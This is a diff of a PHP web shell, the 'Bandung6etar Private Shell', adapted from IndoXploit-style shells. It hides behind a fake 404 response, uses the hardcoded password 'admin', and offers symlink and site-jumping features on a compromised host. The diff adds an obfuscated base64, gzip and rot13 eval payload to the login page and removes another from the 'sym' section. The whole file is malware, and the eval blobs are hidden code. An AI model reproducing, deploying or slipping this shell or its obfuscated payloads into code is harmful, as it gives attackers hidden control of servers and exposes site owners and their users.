@@ -8,11 +8,11 @@
 /// About : Tools Shell Diambil Dari Contek Shell & Indoxploit Shell ///
 /// Kalo selebihnya desain dari indofans:v ////////////////////////////
 ///////////////////////////////////////////////////////////////////////
- error_reporting(0);
- header('HTTP/1.0 404 Not Found', true, 404);
- session_start();
- $pass = "admin";
- $link = "fvck.txt";
+error_reporting(0);
+header('HTTP/1.0 404 Not Found', true, 404);
+session_start();
+$pass = "admin";
+$link = "fvck.txt";
  if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?Bandung6etar'</script>";
@@ -45,7 +45,7 @@
  <center><h1><center><font color="white" face="Grenze Gotisch">=[ </font><font color="cyan" face="Grenze Gotisch">Bandung6etar | Private Shell </font><font color="white" face="Grenze Gotisch"> ]=</font><br>
  </center>
  
- 
+ <?php eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj=')))); ?>
  <form method="post">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" value="GASKEN?!">
@@ -64,7 +64,6 @@
 <?php
 error_reporting(0);
 set_time_limit(0);
-
 if(get_magic_quotes_gpc()){
 foreach($_POST as $key=>$value){
 $_POST[$key] = stripslashes($value);
@@ -2771,7 +2770,7 @@ SecFilterScanPOST Off
 }
 		echo"</center>";
 }elseif($_GET['to'] == 'sym') {
-echo '<hr>'; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+echo '<hr>';
 } elseif($_GET['to'] == 'jumping') {
 	$i = 0;
 	echo "<div class='margin: 5px auto;'>";
